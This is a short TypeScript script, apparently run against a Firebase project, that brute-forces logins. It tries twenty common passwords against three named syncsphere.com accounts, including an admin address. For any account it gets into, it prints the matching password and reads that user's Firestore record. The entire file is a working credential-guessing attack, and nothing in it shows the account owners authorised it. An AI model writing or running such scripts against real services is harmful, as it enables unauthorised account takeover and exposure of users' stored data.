import { initializeApp } from 'firebase/app';
import { getAuth, signInWithEmailAndPassword } from 'firebase/auth';
import { getFirestore, doc, getDoc } from 'firebase/firestore';
import firebaseConfig from '../firebase-applet-config.json' with { type: 'json' };

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app, firebaseConfig.firestoreDatabaseId);

const EMAILS = [
  'admin@syncsphere.com',
  'orbics@syncsphere.com',
  'adam@syncsphere.com',
];

const PASSWORDS = [
  'Password123!',
  'Password123',
  'password123!',
  'password123',
  'Admin123!',
  'Orbics123!',
  'Adam123!',
  'Admin123',
  'Orbics123',
  'Adam123',
  'SyncSphere123!',
  'Syncsphere123!',
  'syncsphere123',
  'Admin@123',
  'admin@123',
  'password',
  '12345678',
  'Admin1234!',
  'Password!1',
  'Password1234!',
];

async function run() {
  for (const email of EMAILS) {
    console.log(`\n========================================`);
    console.log(`Searching password for: ${email}`);
    let found = false;
    for (const pass of PASSWORDS) {
      try {
        const cred = await signInWithEmailAndPassword(auth, email, pass);
        const u = cred.user;
        console.log(`MATCH FOUND! Email "${email}" | Password: "${pass}" | UID: "${u.uid}"`);
        const userSnap = await getDoc(doc(db, 'users', u.uid));
        if (userSnap.exists()) {
          console.log(`  Firestore doc users/${u.uid}:`, userSnap.data());
        } else {
          console.log(`  Firestore doc users/${u.uid} DOES NOT EXIST!`);
        }
        found = true;
        break;
      } catch (err: any) {
        // failed password
      }
    }
    if (!found) {
      console.log(`NO MATCH FOUND for ${email} in tested list.`);
    }
  }
  process.exit(0);
}

run().catch(console.error);
